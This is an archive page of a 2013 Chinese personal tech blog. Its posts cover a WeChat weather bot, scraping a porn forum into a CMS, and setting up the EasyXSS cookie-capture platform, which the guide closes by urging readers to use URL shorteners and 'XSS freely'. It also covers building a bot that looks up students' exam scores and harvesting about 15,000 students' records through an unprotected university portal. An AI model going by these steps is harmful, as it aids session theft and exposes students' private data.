<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <title>双人份 Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="双人份 Blog">
<meta property="og:url" content="http://doubles.me/page/7/index.html">
<meta property="og:site_name" content="双人份 Blog">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="双人份 Blog">
<meta name="twitter:description">
  
    <link rel="alternative" href="/rss.xml" title="双人份 Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css" type="text/css">
</head>

<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img src="http://7xnueu.com1.z0.glb.clouddn.com/avatar.jpg" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">双人份</a></h1>
		</hgroup>

		
		
		<!--Search Box-->


		<div id="Search">
			<form onsubmit="dispatch()" >

			<input type="text" maxlength="40" name="q" id="q" value="" placeholder="Search..." style = "width:180 px; height: 22px;">
			</form>
		</div>
		
<script type="text/javascript">

function dispatch() {
    var q = document.getElementById("q");
    if (q.value != "") {
        var url = 'https://www.google.com/search?q=site:doubles.me%20' + q.value;

        window.open(url, "_blank");
        
        return false;
    } else {
        return false;
    }
}
</script>

        

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>Menu</li>
						<li>Tags</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">归档</a></li>
				        
							<li><a href="/about">关于</a></li>
				        
							<li><a href="/links">友链</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/DoubleShift" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="https://weibo.com/agmol" title="weibo">weibo</a>
					        
								<a class="rss" target="_blank" href="http://doubles.me/rss.xml" title="rss">rss</a>
					        
								<a class="mail" target="_blank" href="/fjjwlzd@163.com" title="mail">mail</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/BackTrack/" style="font-size: 15.71px;">BackTrack</a> <a href="/tags/Notes/" style="font-size: 10px;">Notes</a> <a href="/tags/OpenCV/" style="font-size: 10px;">OpenCV</a> <a href="/tags/VPS/" style="font-size: 10px;">VPS</a> <a href="/tags/android/" style="font-size: 14.29px;">android</a> <a href="/tags/cocos2d/" style="font-size: 12.86px;">cocos2d</a> <a href="/tags/diary/" style="font-size: 12.86px;">diary</a> <a href="/tags/error/" style="font-size: 10px;">error</a> <a href="/tags/fml/" style="font-size: 10px;">fml</a> <a href="/tags/hack/" style="font-size: 20px;">hack</a> <a href="/tags/hackthon/" style="font-size: 10px;">hackthon</a> <a href="/tags/javascript/" style="font-size: 10px;">javascript</a> <a href="/tags/linux/" style="font-size: 11.43px;">linux</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/sae/" style="font-size: 14.29px;">sae</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/云/" style="font-size: 14.29px;">云</a> <a href="/tags/内涵/" style="font-size: 11.43px;">内涵</a> <a href="/tags/吐槽/" style="font-size: 11.43px;">吐槽</a> <a href="/tags/开发/" style="font-size: 18.57px;">开发</a> <a href="/tags/微信公众平台/" style="font-size: 14.29px;">微信公众平台</a> <a href="/tags/杂碎/" style="font-size: 12.86px;">杂碎</a> <a href="/tags/淘宝/" style="font-size: 10px;">淘宝</a> <a href="/tags/硬件/" style="font-size: 10px;">硬件</a> <a href="/tags/网站/" style="font-size: 17.14px;">网站</a> <a href="/tags/翻墙/" style="font-size: 14.29px;">翻墙</a> <a href="/tags/自动登入/" style="font-size: 11.43px;">自动登入</a> <a href="/tags/采集/" style="font-size: 11.43px;">采集</a>
					</div>
				</section>
				
				
				

				
			</div>
		</div>
	</header>				
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">双人份</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
			
				<img src="http://7xnueu.com1.z0.glb.clouddn.com/avatar.jpg" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
			
			</div>
			<hgroup>
			  <h1 class="header-author">双人份</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">归档</a></li>
		        
					<li><a href="/about">关于</a></li>
		        
					<li><a href="/links">友链</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/DoubleShift" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="https://weibo.com/agmol" title="weibo">weibo</a>
			        
						<a class="rss" target="_blank" href="http://doubles.me/rss.xml" title="rss">rss</a>
			        
						<a class="mail" target="_blank" href="/fjjwlzd@163.com" title="mail">mail</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>

      <div class="body-wrap">
  
    <article id="post-600" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/03/19/600/" class="article-date">
  	<time datetime="2013-03-19T13:44:44.000Z" itemprop="datePublished">2013-03-19</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/03/19/600/">查询天气</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>给微信公众平台添加的一个小功能。实现查询天气。 百度得到3个地址接口，当然也可以用google，yahoo的，但是发现只有这一个是json的。所以我就用这个了。</p>
<p><span style="font-family: Arial;"><a href="http://www.weather.com.cn/data/sk/101281601.html" target="_blank" rel="external">http://www.weather.com.cn/data/sk/101281601.html</a> </span></p>
<p><span style="font-family: Arial;"><a href="http://www.weather.com.cn/data/cityinfo/101281601.html" target="_blank" rel="external">http://www.weather.com.cn/data/cityinfo/101281601.html</a> </span></p>
<p><span style="font-family: Arial;"><a href="http://m.weather.com.cn/data/101281601.html" target="_blank" rel="external">http://m.weather.com.cn/data/101281601.html</a>  </span></p>
<p>然后继续百度到一个城市列表，这个网站也没有提供什么api，只有这样了。把这个id表存入数据库吧。</p>
<p>挺麻烦的，不过我还是用excel+php+mysql搞定了。</p>
<p>先用excel拆分一下。</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130319234120.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130319234120.png" alt="QQ20130319234120"></a></p>
<p>然后写个php，提取一下里面的数据。</p>
<p>&lt;?php</p>
<p>$fp = fopen (‘cityid.txt’, “r”);<br>if($fp){<br>while(!feof($fp)){<br>$line1=fgets($fp,4096);<br>$name=split(‘ ‘,$line1);</p>
<p>$line2=fgets($fp,4096);<br>$id=split(‘ ‘,$line2);</p>
<p>for($i=0;$i&lt;count($name);$i++){<br>$current.= ‘(“‘.$name[$i].’”,’.$id[$i].’),’;</p>
<p>}<br>}<br>}else echo’wrong’;<br>file_put_contents(‘result.txt’, $current);<br>fclose($fp);<br>?&gt;</p>
<p>这个过程真心麻烦。然后实现查询功能。<br>&lt;?php<br>//101240101 南昌id<br>header(“Content-Type: text/html;charset=utf-8”);<br>function getWeather($id){<br>$fetch= new BaeFetchUrl();</p>
<p>$fetch-&gt;get(“<a href="http://m.weather.com.cn/data/&quot;.$id.&quot;.html" target="_blank" rel="external">http://m.weather.com.cn/data/&quot;.$id.&quot;.html</a>“);</p>
<p>$obj=json_decode($fetch-&gt;getResponseBody());</p>
<p>$value=$obj-&gt;weatherinfo-&gt;city.’ ‘.$obj-&gt;weatherinfo-&gt;date_y.’ ‘.$obj-&gt;weatherinfo-&gt;temp1.’ ‘.$obj-&gt;weatherinfo-&gt;weather1.’ ‘.$obj-&gt;weatherinfo-&gt;index_d;</p>
<p>return $value;<br>}<br>?&gt;</p>
<p>&nbsp;</p>
<p>看得到我这里使用了bae上的函数。</p>
<p>最后放个文件到这里吧。<a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/天气处理.zip" target="_blank" rel="external">天气处理</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/微信公众平台/">微信公众平台</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Code/">Code</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-577" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/03/12/577/" class="article-date">
  	<time datetime="2013-03-12T13:44:42.000Z" itemprop="datePublished">2013-03-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/03/12/577/">火车头采集器【本次纯属测试】</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&nbsp;</p>
<h1 id="首先申明一下，此次纯属测试，没有任何不良用途。"><strong><span style="color: #ff0000;">首先申明一下，此次纯属测试，没有任何不良用途。</span></strong></h1><p>不知道为什么对采集很敢兴趣，先用火车头采集一点东西吧。</p>
<p>主要是要写采集模块，但是前面写过phpcms和dedecms的采集规则，现在就比较简单了。</p>
<p>看草榴的网址，<a href="http://1024dizhi.tk/thread0806.php?fid=7&amp;search=&amp;page=2" target="_blank" rel="external">http://1024dizhi.tk/thread0806.php?fid=7&amp;search=&amp;page=2</a> 显然修改page后面的就可以访问下一页了。所以从2开始到最后一页，不过我发现非注册用户只能访问前100页，我的帐号也登不上去了。o(︶︿︶)o 唉就抓100页把，后面的大部分图床都挂掉了。</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312230639.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312230639.png" alt="QQ20130312230639"></a></p>
<p>&nbsp;</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312230734.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312230734.png" alt="QQ20130312230734"></a></p>
<p>&nbsp;</p>
<p> 然后编写内容网址采集规则，每条内容页都是这样的形势，他在最后用了一个javascript进行拼接，所以我们就要自己写规则，拼接地址<a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231245.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231245.png" alt="QQ20130312231245"></a></p>
<p>设置成这样的，看图就行了，记得保存<a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231212.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231212.png" alt="QQ20130312231212"></a></p>
<p>然后我们进到内容页，发现文章开始的标签是tpc_content，标题的开始标签是&lt;h4&gt;，注意这些不能有重复。然后就可以写规则开始采集了。</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231528.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231528.png" alt="QQ20130312231528"></a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231428.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231428.png" alt="QQ20130312231428"></a></p>
<p>之后我挂了一晚上，线程不敢开太多，怕封ip，抓取了5000条数据。</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312233110.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312233110.png" alt="QQ20130312233110"></a></p>
<p>再然后就是发布了，可以选择数据入数据库，也可以选择发布到web上去。但是呢，进入数据库要分析表结构，太懒，不相干，就web发布吧。这样效率特别低，不过丢这也不用管，就这样了呗。</p>
<p>现在写发布过程</p>
<p><div></div></p>
<p><div>先把dedecms安装好，其他的phpcms之类的也一样，安装也不用说了吧。</div></p>
<p><div>进入后先个增加这些个栏目，别看我这个网站，我只是想要一个木有广告的自己用。。</div></p>
<p><div></div></p>
<p><div><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image.png" alt="Image"></a></div></p>
<p><div></div></p>
<p><div>选择dedecms5.7的发布模块，编码是utf8，看版本决定，然后把网站根目录写进来，</div></p>
<p><div><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image2.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image2.png" alt="Image2"></a></div></p>
<p><div>点击登入，抓到cookies，点确定，然后保存配置。</div></p>
<p><div><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image3.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image3.png" alt="Image3"></a></div></p>
<p><div></div></p>
<p><div>然后选择一个任务，进行编辑，定位到发布设置，然后3个步骤改一下。保存之。</div></p>
<p><div><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image4.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image4.png" alt="Image4"></a></div></p>
<p><div></div></p>
<p><div>最后我们到网站上看一下效果</div></p>
<p><div></div></p>
<p><div></div></p>
<p><div></div></p>
<p><div><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312233941.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312233941.png" alt="QQ20130312233941"></a></div></p>
<p><div></div></p>
<p><div><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312234204.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312234204.png" alt="QQ20130312234204"></a></div></p>
<p><div></div></p>
<div>

<h1 id="再次申明一下，此次纯属测试，没有任何不良用途。"><span style="color: #ff0000;"><strong>再次申明一下，此次纯属测试，没有任何不良用途。</strong></span></h1><h1 id="如果有人用于非法用途，与本博客无关。"><span style="color: #ff0000;"><strong>如果有人用于非法用途，与本博客无关。</strong></span></h1><p></p></div><br>&nbsp;<p></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/杂碎/">杂碎</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网站/">网站</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Others/">Others</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-560" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/03/12/560/" class="article-date">
  	<time datetime="2013-03-12T03:09:44.000Z" itemprop="datePublished">2013-03-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/03/12/560/">easyxss平台搭建</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <div><span style="color: #ff0000;">bae上搭建easyxss</span>【如果不是bae，sae上就不需要】</div><br><div>@<a href="http://zone.wooyun.org/user/%E6%98%B5%E7%A7%B0" target="_blank" rel="external">昵称</a> 目测bae和sae都是要使用重写功能<br>bae  修改 app.conf<br>格式：<br>- url : /member/(.+)$<br>script : member.php?mid=$1</div><br><div></div><br><div>sae修改 config.yaml<br>格式：<br>- rewrite: if( path ~ “^feed$” ) goto “feed.php”</div><br><div></div><br><div>测试发现，bae上搭建不了。应该要修改thinkphp，所以使用phpcloud来搭建。</div><br><div></div><br><div></div><br><div><span style="color: #ff0000;"> App/Conf/config.php 配置文件</span></div><br><div></div><br><div>&lt;?php<br>return array(<br>‘DEFAULT_MODULE’     =&gt; ‘User’,<br>‘URL_MODEL’          =&gt; ‘0’, //这里改成0，原来是2，具体设置请参考THINKPHP配置说说明<br>‘SESSION_AUTO_START’ =&gt; true,<br>‘DB_DSN’ =&gt; ‘mysql://root:toor@127.0.0.1:3306/xss’, //数据库链接信息，用户名@密码，最后的是数据库名<br>‘DB<em>PREFIX’ =&gt; ‘xss</em>‘,<br>‘MAIL_ADDRESS’=&gt;’info@xss.tw’,<br>‘MAIL_SMTP’=&gt;’smtp.gmail.com’,<br>‘MAIL_LOGINNAME’=&gt;’info@xss.tw’,<br>‘MAIL_PASSWORD’=&gt;’’,<br>‘MAIL_SENDER’=&gt;’info’,<br>‘MAIL_PORT’=&gt;’465’,<br>‘TMPL_PARSE_STRING’ =&gt;array(<br>‘<strong>SITENAME</strong>‘ =&gt;’EasyXSS 1.0’,<br>‘<strong>SITETITLE</strong>‘=&gt;’EasyXSS’,<br>),<br>);<br>?&gt;</div><br><div></div><br><div><span style="color: #ff0000;">wwwroot目录是web根目录，wwwroot/index.php定义了framework与application的路径，你改了就要跟着改。</span></div><br><div></div><br><div>&lt;?php<br>define(‘APP_NAME’, ‘./XSS’);<br>define(‘APP_PATH’, ‘./../App/‘); //App那个文件夹的路径，改掉了就跟着改<br>define(‘APP_DEBUG’, true); //debug开关require ‘./../ThinkPHP/ThinkPHP.php’; //thinkphp framework 的路径?&gt;</div><br><div></div><br><div>data.sql导入数据库，这里不说了。</div><br><div></div><br><div></div><br><div>有一个邀请码：1234567890<br>请注册名字为：root的用户，才能生成邀请码</div><br><div></div><br><div>注册一个用户名为root的用户，</div><br><div>邀请码生成URL：/Key/createKey/count/1/type/1<br>count为数量，type为类型:0为自助申请，1为手动发放的邀请码，不被自助申请获得到</div><br><div><img src="file:///C:/Users/Daddy/AppData/Local/Temp/enhtmlclip/Image.png" alt=""></div><br><div>界面模仿xsser.me,PHP代码没参考任何其他平台，所以写得很烂。现在的新版本基本上重写，主要方面是用户权限控制，使用类的继承，方便多了。keepsession： 定期访问 /Xssresult/Keepsession 即可，或者定期执行Keepsession文件夹下的php脚本。</div><br><div></div><br><div><br><br>phpcloud申请账号，然后创建一个app。<br><br>然后会得到一个key，.ppt的这时候用winscp连上去。<br><br>，地址如下，很多都是你设置的容器的名字。<br><br>如下图<br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/3.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/3.bmp" alt="3"></a><br><br>&nbsp;<br><br>然后将这个我修改好的easyxss平台代码丢上去，修改所有目录属性为777。不然会提示run error，因为没有写入权限。<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/4.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/4.bmp" alt="4"></a><br><br>&nbsp;<br><br>然后修改conf文件，最好用notepad++修改好了再覆盖上去。不然会有其他的错误<br><br>Assuming your container name is <code>**_mycontainer_**</code>, you should use the following credentials to connect to your database:<br><br><em>   <strong>Database host:</strong><em>mycontainer</em>-db.my.phpcloud.com
</em>   <strong>Database port:</strong> 3306<br><em>   <strong>Database schema name:</strong><em>mycontainer</em>
</em>   <strong>Database user:</strong><em>mycontainer</em><br><em>   <em>*Database password:</em></em> your container password导入mysql数据库，可以使用phpadmin或者ssh的方式<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/5.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/5.bmp" alt="5"></a><br>我导入的是去掉iptables的，因为他这个ip表有20多m，不好上传。等我回寝室再导入把。<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/11.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/11.bmp" alt="1(1)"></a><br><br>然后进入dnspod，把域名绑定以下。<br><br>&nbsp;<br><br>将域名cname到 <em>mycontainer</em>.my.phpcloud.com，就是你可以直接访问的地址。<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/6.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/6.bmp" alt="6"></a> <a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/11.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/11.bmp" alt="1(1)"></a><br><br>现在就可以通过绑定的域名进行访问了。<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/21.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/21.bmp" alt="2(1)"></a><br><br>&nbsp;<br><br>然后要注意的是phpcloud必须要每天登入一次来激活，这个可以使用我们的监控宝来完成<br><br></div><br><div><br><br>到此我们就完成平台搭建的所有工作，然后可以使用url缩短服务，尽情的xss去吧。<br><br></div><br><div></div>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/云/">云</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Hack/">Hack</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-542" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/03/10/542/" class="article-date">
  	<time datetime="2013-03-10T00:36:01.000Z" itemprop="datePublished">2013-03-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/03/10/542/">微信平台酱菜小助手</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>今天总算把4级的查询移到微信平台上去了。以前感觉很神器，原来也就是分词，然后返回一个数据。</p>
<p>系统内置了一些功能，不过我们是要查询cet4，6级 还是要自定义返回数据格式才好。</p>
<p>先去注册一个公众帐号，这个公众平台和开放平台是不一样的</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130310025443.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130310025443-430x106.png" alt="QQ20130310025443"></a>然后捏，进入高级设置后，进入里面的编辑模式关闭掉，然后进入开发者模式，打开此模式。</p>
<p>这里需要有一个空间才行，可以把我们的接口文件丢这里。</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ201303100255231.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ201303100255231.png" alt="QQ20130310025523"></a></p>
<p>我用的是bae，sae，openshift什么的都可以。刚好今天令了bae发放的1000元现金券。</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ201303100255471.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ201303100255471.png" alt="QQ20130310025547"></a></p>
<p>&nbsp;</p>
<p>在里面填入中转接口的地址，weixin这个在php里面设置。</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130310102712.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130310102712.png" alt="QQ20130310102712"></a>给个地址吧。<a href="https://github.com/xhxu/weixin" target="_blank" rel="external">https://github.com/xhxu/weixin</a>，可以使用这个。</p>
<p>里面的代码很简单了，先把消息体剥离一下，通过空格分离出keyword，然后进行操作。</p>
<p>//分词处理，通过空格 剥离$keyword<br>$keyword = $weixin-&gt;msg[‘Content’];<br>$keyword=explode(“ “,$keyword);</p>
<p>代码感觉没什么看的，我给添加了一个mysql查询的语句，就可以返回4，6级成绩了。</p>
<p>输入 【help】 可以获取帮助，输入 【cet 学号】(中间有空格哦),可以获取4，6级成绩</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/2.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/2.png" alt="2"></a></p>
<p>&nbsp;</p>
<p>大家可以搜索 酱菜小助手，或者扫描如下2维码，添加关注。</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/qr.jpg" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/qr.jpg" alt="qr"></a></p>
<p>&nbsp;</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/江财微信平台.zip" target="_blank" rel="external">江财微信平台</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Code/">Code</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-536" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/03/02/536/" class="article-date">
  	<time datetime="2013-03-02T11:43:09.000Z" itemprop="datePublished">2013-03-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/03/02/536/">试了一下采集</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>想采集1024的，他地址是用脚本生成的，不会改。</p>
<p>后面就随便找了一个站，来试试。</p>
<p>火车头一直采不到内容，但是同样的规则我用phpcms就可以采集到</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130302214216.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130302214216-430x200.png" alt="QQ20130302214216"></a></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>晚上采集一下电影试试</p>
<p>&nbsp;</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网站/">网站</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Others/">Others</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-529" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/03/02/529/" class="article-date">
  	<time datetime="2013-03-02T11:36:18.000Z" itemprop="datePublished">2013-03-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/03/02/529/">继续昨天的4级查询</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>后面他写了一个通过学号查询成绩的，然后我们打算完善一下这个，最好可以显示班级，之后被路人甲告知有一个地方能查到学生的学号和班级，于是乎。。</p>
<p>这个真心佩服，首先进入学生通道旁边的教师通道。然后查询课程。这里可以查询所有的开放课程，没验证，然后查询 品行修养这每个班都有的课程就可以得到所有的班级列表，然后遍历所有连接，就可以得到所有班级的学生信息。</p>
<p>一共321个班级 大概有1w5的学生。<a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130302203519.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130302203519-430x193.png" alt="QQ20130302203519"></a> <a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130302203554.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130302203554.png" alt="QQ20130302203554"></a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ截图20130302204725.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ截图20130302204725-430x200.png" alt="QQ截图20130302204725"></a></p>
<p>&nbsp;</p>
